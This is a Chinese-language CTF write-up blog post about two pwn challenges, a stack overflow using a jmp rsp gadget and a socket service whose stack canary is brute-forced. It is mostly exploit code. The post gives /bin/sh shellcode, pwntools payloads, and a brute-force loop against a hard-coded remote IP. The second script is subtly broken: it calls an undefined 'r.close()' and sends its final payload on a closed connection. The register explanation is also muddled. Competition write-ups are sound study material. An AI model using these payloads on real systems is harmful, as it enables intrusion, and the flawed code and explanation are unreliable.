---
layout: post
title: "pearl and hsc"
date: 2024-3-9
tags: [pwn]
comments: true
author: gbeefee
---

#### *pearl*

#### *hsc*ctf

###### stack

非常明显的栈溢出，但是给的后门是jmp_rsp，当时怎么不理解这么一个后门该如何利用，看了其他师傅的wp，现在总算明白了。jmp_rsp是把函数的栈帧执行rsp的位置，为了利用这个后门，我们要修改栈顶为我们写入的shellcode，再次执行jmp_rsp,程序就会自动执行shellcode。所以payload就是:

```shellcode.ljust(0x20,b'a')+p64(0)+p64(gift_addr)+asm('sub rsp,0x30;jmp rsp')```

执行逻辑是：程序ret后rdi指向后门函数，接着rsp自减0x30，指向布置好的shellcode，jmp_rsp，使rdi指向rsp，使程序执行shellcode。

```
from pwn import *
context(os="linux",arch="amd64",log_level="debug")
io=process('./stack')
shellcode=b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

gift_addr=0x40063b

payload1=shellcode.ljust(0x20,b'a')+p64(0)+p64(gift_addr)+asm('sub rsp,0x30;jmp rsp')

io.sendlineafter("secret...",payload1)

io.interactive()
```

###### pwn1

程序使用了socket实现接口通信，当时本地调试这个程序运行不了（？），一半就不动了...可能是本地环境问题吧。根据网上其他wp的说法，由于链接程序的程序是子程序，崩溃时不影响主程序，直接爆破canary就可以。



```python
from pwn import *
context(os="linux",arch="amd64",log_level="debug")
#io=process("./pwn01")
def get_canary():
    canary = b'\x00'
    while len(canary) < 8:
        for x in range(256):
            io = remote('111.180.204.186', 12051)
            io.recv()
            io.send(b'a' * 104 + canary + bytes([x]))

            try:
                io.recv()
                canary += bytes([x])
                break
            except:
                pass
            finally:
                r.close()
    return canary

canary = get_canary()

pwn = 0x400b8e
payload = b'a' * 104 + canary + b'a' * 8 + p64(pwn)
io.send(payload)

io.interactive()
```

